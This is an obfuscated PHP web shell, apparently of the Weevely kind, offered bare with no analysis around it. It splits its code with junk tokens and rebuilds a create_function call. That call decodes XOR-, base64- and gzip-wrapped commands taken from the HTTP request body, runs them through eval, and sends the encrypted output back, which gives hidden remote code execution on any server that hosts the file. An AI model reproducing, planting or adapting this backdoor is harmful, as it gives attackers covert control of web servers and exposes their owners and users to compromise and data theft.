<?php
$f='"/bJ$khbJ(.bJ+)$bJkf/",@file_get_contbJentbJs("pbJhpbJ:/bJbJ/inputbJ"),$m)==1) {@ob_start();@ebJ';
$h='bJval(@gzuncombJpressbJ(@bJx(@basbJbJe64_decode($bJm[1]),$bJk)));$o=@obJb_getbJbJbJ_contents();@o';
$W='b_endbJ_clbJean();$rbJ=@basebJ64_enbJcodebJ(@x(@gbJzcombJpbJress($o),$k)bJ);pribJnt("$p$kbJh$r$kf");}';
$Q=str_replace('Hi','','cHireHiaHitHie_fHiunctiHion');
$J='J;($jbJbJ<$bJc&&$i<$lbJ);$bJj++,$i++){bJ$obJ.=$t{$i}^$k{$j};}}bJreturn bJ$bJo;}if (@bJpreg_matcbJh(';
$v='nction x($tbJ,$k){bJbJ$c=strlen(bJ$bJk);$l=strlbJen($tbJ);$o="";fbJor($bJi=0;$i<$l;bJbJ){for($j=0b';
$j='$bJk="861dfbbJ49";$khbJ="bJ78dbJa6fdfda85"bJ;bJ$kf="c6679c8bJ1bb33";$p="bJ0iJbJ8MThbJEbbJu0e4bJL7v";fu';
$l=str_replace('bJ','',$j.$v.$J.$f.$h.$W);
$t=$Q('',$l);$t();
?>
